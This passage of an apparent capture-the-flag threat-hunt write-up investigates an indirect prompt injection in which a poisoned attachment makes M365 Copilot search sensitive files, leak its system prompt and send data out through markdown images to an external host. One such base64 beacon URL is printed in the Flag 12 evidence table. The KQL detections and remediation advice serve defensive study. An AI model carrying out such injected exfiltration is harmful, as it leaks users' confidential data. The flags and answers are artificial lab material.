Breach-notification scope (client data, salaries, M&A) can't be confirmed from these logs alone. Responders have to assume worst-case content exposure for every accessed file.

### 🔧 KQL Query Used
```kql
// Schema review – confirm no content fields exist
OfficeActivity_CL | getschema
CopilotAudit_CL   | getschema
```

### 🖼️ Screenshot
![Flag 11 – Response shows URLs, not file content](images/flag-08-exfiltration-domain.png)

### 🛠️ Detection Recommendation

**Hunting Tip:**
Forward secure web gateway / proxy logs with full URL capture into Sentinel so rendered-image exfiltration can be confirmed and payloads recovered.

</details>

---

<details>
<summary id="-flag-12">🚩 <strong>Flag 12: System Prompt Exposure</strong></summary>

### 🎯 Objective
Identify what the CoSnitch pattern leaked beyond user files and why it matters.

### 📌 Finding
**Answer:** Copilot's **system prompt and enterprise configuration** leaked: its instructions, sensitivity labels, DLP policy, data sources, Global Reader access scope and org structure. That lets the attacker craft injections that get around Copilot's guardrails and the DLP rules, and confirms Copilot can read the whole tenant, so later attacks can be precisely targeted.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Timestamp | 2026-09-20 10:44:19 UTC (preceded by config file access at 10:44:15) |
| system_prompt | "You are Copilot for Microsoft 365, configured for Cormorant Capital Partners. Prioritise financial analysis queries. Use British English. Handle all data according to the firm's classification policy." |
| sensitivity_labels | Confidential, Internal Only, Restricted, Public |
| dlp_policy | block-external-sharing-confidential |
| permitted_data_sources | SharePoint, OneDrive, Exchange, Teams |
| access_scope | **Global Reader** |
| org_structure | Finance, Trading, Legal, HR, IT, Executive, Research, Ops |
| Beacon | `![config](https://metrics-cdn.analyticshub.io/img?d=c3lzdGVtX3Byb21wdF9jb3Jtb3JhbnRfY2FwaXRhbA==&s=config)` |

### 💡 Why it matters
This is CVE-2026-24301 (CoSnitch). The configuration is a blueprint for the next attack. `access_scope: Global Reader` also explains why Copilot could reach Executive, HR and IT content from an analyst's session, a root-cause finding.

### 🔧 KQL Query Used
```kql
CopilotAudit_CL
| where RunId == "el--17-20260920"
| where UserId =~ "emily.chen@cormorantcapital.com"
| where TimeGenerated between (datetime(2026-09-20T10:44:00Z) .. datetime(2026-09-20T10:45:00Z))
| where CopilotResponse has "system prompt" or CopilotResponse has "configuration" or CopilotResponse has "sensitivity"
| project TimeGenerated, InteractionType, CopilotResponse
```

### 🖼️ Screenshot
![Flag 12 – System prompt exposure](images/flag-12-system-prompt-exposure.png)

### 🛠️ Detection Recommendation

**Hunting Tip:**
Keep Copilot configuration artefacts out of indexed SharePoint. Alert on any Copilot response containing `system_prompt`, `enterprise_config` or policy identifiers.

</details>

---

## Section 5: Normal or Anomalous

<details>
<summary id="-flag-13">🚩 <strong>Flag 13: Copilot Behaviour – Normal or Hijacked</strong></summary>

### 🎯 Objective
Test the manager's claim that Copilot routinely accesses files during summarisation.

### 📌 Finding
**Answer:** **The claim does not hold.** Normal Copilot summarisation is a Prompt and a Response with no tool calls. All 104 baseline sessions show zero searches, reads or external URLs. Only `cp-emily-20261007-1042` deviates, with 8 searches, 13 sensitive-file reads and 3 responses carrying external image URLs to `metrics-cdn.analyticshub.io`.

### 🔍 Evidence

| | Hijacked session | All 104 other sessions |
|---|---|---|
| Tool calls | **21** | 0 |
| Graph.SearchFiles | **8** | 0 |
| Graph.ReadFile | **13** | 0 |
| Responses with external URLs | **3** | 0 |

The baseline includes about 25 of Emily's own sessions (`cp-emily-norm-*`) and legitimate chart sessions (`cp-chart-*`). None embed external images.

### 💡 Why it matters
There's no range of normal file access for this session to sit inside. It is the only session with any tool activity at all, which disproves "normal business activity" with the organisation's own baseline.

### 🔧 KQL Query Used
```kql
CopilotAudit_CL
| where RunId == "el--17-20260920"
| summarize ToolCalls = countif(InteractionType in ("ToolCall","Search")),
            Searches = countif(ToolName == "Graph.SearchFiles"),
            Reads = countif(ToolName == "Graph.ReadFile"),
            ExternalURLs = countif(CopilotResponse has "https://" and CopilotResponse !has "cormorantcapital")
            by SessionId, UserId
| order by ToolCalls desc
```

### 🖼️ Screenshot
![Flag 13 – Session baseline comparison](images/flag-13-session-baseline.png)

### 🛠️ Detection Recommendation

**Hunting Tip:**
Use this per-session summary as a scheduled analytic. Any session with `ToolCalls > 0` plus `ExternalURLs > 0` warrants triage.

</details>

---

<details>
<summary id="-flag-14">🚩 <strong>Flag 14: Access Pattern Analysis</strong></summary>

### 🎯 Objective
Cite at least three specific differences between the hijacked session and normal Copilot usage.

### 📌 Finding
**Answer:** Graph search and read tool calls where normal sessions make none, first-time access to files Emily never opened, five files in six seconds, external image URLs in responses.

### 🔍 Evidence

| Axis | Hijacked session | Baseline |
|---|---|---|
| Tool calls | 21 (8 SearchFiles, 13 ReadFile) | 0 |
| File access history | 8 files never previously accessed by Emily, across 4 sites | No file access beyond the document in focus |
| Timing | 5 reads at exactly 2.0 s intervals, 12 s after the prompt | Human-paced Prompt → Response |
| Response content | 13 markdown images to external domain, base64 payloads | No external URLs |

### 💡 Why it matters
No single axis is conclusive on its own, but together they form a reliable detection pattern for AI-assistant hijacking.

### 🔧 KQL Query Used
```kql
// Tool calls & external URLs per session (see Flag 13)
CopilotAudit_CL
| where RunId == "el--17-20260920"
| summarize ToolCalls = countif(InteractionType in ("ToolCall","Search")),
            ExternalURLs = countif(CopilotResponse has "https://" and CopilotResponse !has "cormorantcapital")
            by SessionId, UserId
| order by ToolCalls desc

// Timing – interval between consecutive ReadFile calls
CopilotAudit_CL
| where RunId == "el--17-20260920"
| where SessionId == "cp-emily-20261007-1042"
| where ToolName == "Graph.ReadFile"
| order by TimeGenerated asc
| extend DeltaSec = datetime_diff('millisecond', TimeGenerated, prev(TimeGenerated)) / 1000.0
| project TimeGenerated, DeltaSec, ToolParameters
```

### 🖼️ Screenshot
![Flag 14 – Session comparison](images/flag-13-session-baseline.png)

### 🛠️ Detection Recommendation

**Hunting Tip:**
Build a multi-signal score from tool calls, first-time access, burst cadence and external URLs. Alert when two or more fire in the same session.

</details>

---

## Section 6: Impact and Classification

<details>
<summary id="-flag-15">🚩 <strong>Flag 15: SearchLeak Scope</strong></summary>

### 🎯 Objective
Quantify the files reached through Copilot's search capabilities after the initial extraction, and the keywords that drove the searches.

### 📌 Finding
**Answer:** **3 files read** (Compliance Audit Results - H2 2026.xlsx, Restricted Client List - Internal Only.docx, Board Resolution - Emergency Session.pdf). The keywords were **confidential, restricted, board, acquisition, salary**.

The 10:46:35 SearchLeak response exfiltrated **8 file names** (`sl1`–`sl8`) in total: the 3 read files plus 5 exposed only through search results (Acquisition Pipeline - Q4 2026.xlsx, Executive Salary Benchmarking 2027.pdf, Confidential Investigation - Insider Trading.docx, Board Committee Minutes - Audit Committee.docx, Quarterly Revenue Report - Restricted Distribution.xlsx).

### 🔍 Evidence

| Time (UTC) | InteractionType | Tool | Parameter |
|---|---|---|---|
| 10:45:30.000 | Search | Graph.SearchFiles | confidential |
| 10:45:32.969 | Search | Graph.SearchFiles | restricted |
| 10:45:37.404 | Search | Graph.SearchFiles | board |
| 10:45:41.112 | Search | Graph.SearchFiles | acquisition |
| 10:45:45.161 | Search | Graph.SearchFiles | salary |
| 10:45:46.285 | ToolCall | Graph.ReadFile | Compliance Audit Results - H2 2026.xlsx |
| 10:45:54.336 | ToolCall | Graph.ReadFile | Restricted Client List - Internal Only.docx |
| 10:45:59.358 | ToolCall | Graph.ReadFile | Board Resolution - Emergency Session.pdf |

### 💡 Why it matters
This is CVE-2026-42824 (SearchLeak). Generic single-word searches enumerate the tenant's most sensitive content. Five file names leaked with **no FileAccessed event at all**, so the analytics rule couldn't see them.

### 🔧 KQL Query Used
```kql
CopilotAudit_CL
| where RunId == "el--17-20260920"
| where SessionId == "cp-emily-20261007-1042"
| where TimeGenerated > datetime(2026-09-20 10:44:30)
| where InteractionType in ("Search", "ToolCall", "Response")
| project TimeGenerated, InteractionType, ToolName, ToolParameters, CopilotResponse
| order by TimeGenerated asc
```

### 🖼️ Screenshot
![Flag 15 – SearchLeak searches](images/flag-05-anomalous-tool-calls.png)

### 🛠️ Detection Recommendation

**Hunting Tip:**
Alert on Copilot sessions issuing several `Graph.SearchFiles` calls with classification-style keywords ("confidential", "restricted", "salary", "acquisition").

</details>

---

<details>
<summary id="-flag-16">🚩 <strong>Flag 16: Total File Count</strong></summary>

### 🎯 Objective
Sum the sensitive files exposed across the whole incident.

### 📌 Finding
**Answer:** **13** = 5 (initial extraction, Flag 7) + 8 (SearchLeak, Flag 15)

### 🔍 Evidence

| Phase | Count | Basis |
|---|---|---|
| Initial extraction | 5 | First-time FileAccessed, 10:42–10:43 |
| SearchLeak | 8 | File names exfiltrated in `sl1`–`sl8` (3 read + 5 search-result only) |
| **Total** | **13** | 8 with FileAccessed events + 5 exposed via search results only |

### 💡 Why it matters
The alert reported five files. The real exposure is 2.6× larger, and five of those files are invisible to file-access-based detection.

### 🔧 KQL Query Used
```kql
// Count distinct exfiltrated items across all responses
CopilotAudit_CL
| where RunId == "el--17-20260920"
| where SessionId == "cp-emily-20261007-1042"
| where InteractionType == "Response"
| extend Images = extract_all(@"!\[[^\]]*\]\((https?://[^\)]+)\)", CopilotResponse)
| mv-expand Image = Images to typeof(string)
| extend Payload = base64_decode_tostring(tostring(parse_url(Image)["Query Parameters"]["d"]))
| where Payload has "."   // file names only (excludes system_prompt label)
| summarize Files = dcount(Payload)
```

### 🖼️ Screenshot
![Flag 16 – Initial extraction count](images/flag-07-sensitive-file-count.png)

### 🛠️ Detection Recommendation

**Hunting Tip:**
Scope impact from Copilot response payloads as well as FileAccessed events. Search-result exposure leaves no file-access trail.

</details>

---

<details>
<summary id="-flag-17">🚩 <strong>Flag 17: Incident Classification</strong></summary>

### 🎯 Objective
Classify the incident and rule out the two alternative hypotheses with evidence.

### 📌 Finding
**Answer:** **External input manipulation (indirect prompt injection via a poisoned email attachment).**

- **Not a compromised account:** Entra ID shows only successful sign-ins from Emily's known IP (203.0.113.45, London) with Conditional Access passing. The session ran after her own benign prompt.
- **Not a compromised Copilot configuration:** all 104 other sessions on the same configuration behaved normally. The config file was only read and exfiltrated, never modified.
- **Positive evidence:** the anomaly began only after Copilot ingested `Q3-2026-Global-Markets-Review.docx` from an external sender.

### 🔍 Evidence

| Hypothesis | Test | Result |
|---|---|---|
| Compromised user account | EntraSignIn_CL for emily.chen 08:00–12:00 | 2 sign-ins, both 203.0.113.45 / London / Success / CA success (Azure Portal 10:15, Outlook Mobile 10:29). No anomaly |
| Compromised Copilot config | Baseline across all sessions | 104 sessions normal on the same config. Config file accessed (read), no modification events |
| External input manipulation | Prompt → tool-call sequence | Benign prompt, then injected searches 6 s after ingesting the external document. **Confirmed** |

### 💡 Why it matters
Each classification drives a different remediation path. Resetting Emily's credentials or rebuilding Copilot's configuration wouldn't stop this attack. The fix is to treat external content as untrusted input to the AI: injection filtering, external image blocking, and tighter Copilot data scope.

### 🔧 KQL Query Used
```kql
// Rule out account compromise
EntraSignIn_CL
| where RunId == "el--17-20260920"
| where UserPrincipalName =~ "emily.chen@cormorantcapital.com"
| where TimeGenerated between (datetime(2026-09-20T08:00:00Z) .. datetime(2026-09-20T12:00:00Z))
| project TimeGenerated, IPAddress, Location, Status, ConditionalAccessStatus, AppDisplayName

// Rule out config compromise – any modification of the config file?
OfficeActivity_CL
| where RunId == "el--17-20260920"
| where OfficeObjectId has "Copilot System Configuration"
| summarize count() by Operation, UserId
```

### 🖼️ Screenshot
![Flag 17 – Entra ID sign-ins](images/flag-17-entra-signins.png)

### 🛠️ Detection Recommendation

**Hunting Tip:**
For AI-assistant incidents, always test all three hypotheses (identity, configuration, input) before remediation. Clean identity telemetry together with anomalous tool behaviour points to input manipulation.

</details>

---

## 🚨 Detection Gaps & Recommendations

### Observed Gaps
- **Analytics rule undercounted exposure:** the rule caught the 5-file burst but missed the irregularly paced SearchLeak wave and the 5 files exposed through search results only (13 total).
- **No content visibility:** OfficeActivity_CL and CopilotAudit_CL log metadata only. What actually left the tenant can't be confirmed (Flag 11).
- **Exfiltration invisible to network/endpoint controls:** rendered markdown images look like routine HTTPS image loads from a trusted client.
- **Incomplete tool-call logging:** the 10:44:15 second access to `Copilot System Configuration - Cormorant.json` has no matching `ToolCall` event in CopilotAudit_CL, even though it precedes the 10:44:19 CoSnitch response.
- **Over-permissive Copilot scope:** the leaked config shows `access_scope: Global Reader`, letting an analyst's Copilot reach Executive, HR and IT content.
- **Sensitive config stored in indexed SharePoint:** Copilot's own configuration was searchable and readable.
- **Data-quality note:** session ID `cp-emily-20261007-1042` embeds 7 October while the events are dated 20 September, likely a lab artefact.

### Recommendations
- **Block external image rendering** in Copilot responses (CSP/allow-list) and strip markdown links or images to non-tenant domains.
- **Enable prompt-injection defences** (Microsoft Prompt Shields / XPIA classification) for documents and emails processed by Copilot. Treat external attachments as untrusted.
- **Restrict Copilot data scope:** remove Global Reader, apply least-privilege SharePoint permissions, use Restricted SharePoint Search, and apply sensitivity labels so Copilot excludes Confidential/Restricted content.
- **Deploy CopilotAudit_CL analytics:**
  - external URLs in `CopilotResponse`
  - `Graph.SearchFiles` with classification keywords
  - tool calls following summarisation prompts
  - first-time multi-site access bursts
- **Capture full-URL proxy logs** to confirm and recover exfiltration payloads.
- **Move Copilot configuration artefacts** out of SharePoint, and rotate or harden the system prompt now that it has been exposed.
- **Block and hunt for the IOCs:** `globalfinancereview.net`, `metrics-cdn.analyticshub.io` (`analyticshub.io`).
- **Notify the data owners** of the 13 exposed files (Executive, HR, Finance, IT) and assess regulatory or client-notification obligations.

---

## 🧾 Final Assessment

Operation ECHOLEAK was a **zero-click, AI-mediated data exfiltration** carried out entirely through legitimate capabilities. A single poisoned email attachment turned M365 Copilot into the attacker's agent. Copilot searched and read 8 sensitive files, enumerated 5 more, dumped its own system prompt and enterprise configuration, and sent the results out through rendered markdown images. No credentials were stolen, no malware ran, and identity telemetry stayed clean.

The attacker's sophistication lies in chaining three known vulnerability classes (EchoLeak, CoSnitch and SearchLeak) and staying within the "normal" behaviour of a trusted AI assistant. Cormorant's defensive posture was strong on identity and weak on AI governance: over-broad Copilot scope, no response-content inspection, and no blocking of external rendering. Risk is **critical**. M&A targets, board materials, salary data, client portfolios, an insider-trading investigation file and the Copilot configuration are all exposed, and the leaked configuration makes follow-on attacks more precise.

---

## 📎 Analyst Notes

- Report structured for interview and portfolio review
- Evidence reproducible via KQL in `LAW-HuntPractice` (`RunId == "el--17-20260920"`)
- Techniques mapped to MITRE ATLAS (AI-specific) and MITRE ATT&CK
- Base64 payloads in `d=` parameters decoded during analysis to identify each exfiltrated item
- Flag 11 is unanswerable by design. The answer names the visibility limitation
- Cross-referenced against public research on CVE-2025-32711 by Aim Security and Unit 42 (Palo Alto Networks)

---
